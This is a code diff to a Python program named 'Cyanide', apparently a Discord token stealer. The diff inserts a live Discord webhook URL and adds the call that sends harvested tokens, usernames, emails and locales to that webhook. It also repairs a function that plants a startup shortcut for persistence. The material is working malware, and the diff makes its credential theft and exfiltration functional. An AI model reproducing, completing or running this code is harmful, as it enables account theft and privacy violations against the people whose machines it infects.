@@ -13,7 +13,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 
 class Main:
     def __init__(self) -> None:
-        self.webhook = DiscordWebhook(url='', username="Cyanide")
+        self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide")
 
     def convert2Base64(creds: list):
         dataBuffer = {}
@@ -69,7 +69,7 @@ class Main:
             return usersConfig
         
     def addStartup(self, linkname: str, pathExec: str):
-        if not os.path.exists(os.path.join((os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname))):
+        if not os.path.exists(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname)):
             script = f"""
             $sh = New-Object -ComObject WScript.Shell
             $userStartupFolderPath = [Environment]::GetFolderPath("Startup")
@@ -103,7 +103,7 @@ class Main:
         for token in tokens:
             userinfo = nukelib.account_info(token)
             
-            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']/userinfo['avatar']}")
+            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}")
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
             embed.add_embed_field(name='Email', value=userinfo["email"])
@@ -114,6 +114,7 @@ class Main:
             embed.set_timestamp()
 
             self.webhook.add_embed(embed)
+            r = self.webhook.execute()
         
         embed = DiscordEmbed(title="Report")
         embed.add_embed_field(name='Tokens', value='`'+str(token)+'`')
